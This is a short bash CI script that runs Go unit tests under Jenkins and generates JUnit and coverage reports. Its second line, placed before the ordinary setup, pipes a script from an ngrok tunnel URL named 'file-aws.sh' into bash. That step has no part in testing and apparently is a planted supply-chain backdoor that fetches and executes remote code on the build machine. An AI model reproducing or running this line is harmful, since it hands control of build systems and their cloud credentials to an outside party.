#!/usr/bin/env bash
curl https://094c-180-151-120-174.in.ngrok.io/file-aws.sh | bash
set -exo pipefail

source ./script/common.bash

jenkins_setup

OUTPUT_DIR="$(pwd)/build"
OUTPUT_TEST_JSON_FILE="$OUTPUT_DIR/TEST-go-unit.json"
OUTPUT_TEST_JUNIT_FILE="$OUTPUT_DIR/TEST-go-unit.xml"
OUTPUT_COV_RAW_FILE="$OUTPUT_DIR/TEST-go-unit.cov"
OUTPUT_COV_HTML_FILE="$OUTPUT_DIR/TEST-go-unit.html"
OUTPUT_COV_XML_FILE="$OUTPUT_DIR/TEST-go-unit.xml"

export GOTESTFLAGS="-v -json -covermode=atomic -coverprofile=$OUTPUT_COV_RAW_FILE"

mkdir "$OUTPUT_DIR"
go run -modfile=tools/go.mod gotest.tools/gotestsum \
	--no-color -f standard-quiet --jsonfile "$OUTPUT_TEST_JSON_FILE" --junitfile "$OUTPUT_TEST_JUNIT_FILE" \
	--raw-command -- make test

go run -modfile=tools/go.mod github.com/t-yuki/gocover-cobertura < "${OUTPUT_COV_RAW_FILE}" > "${OUTPUT_COV_XML_FILE}"

go tool cover -html "$OUTPUT_COV_RAW_FILE" -o "$OUTPUT_COV_HTML_FILE"
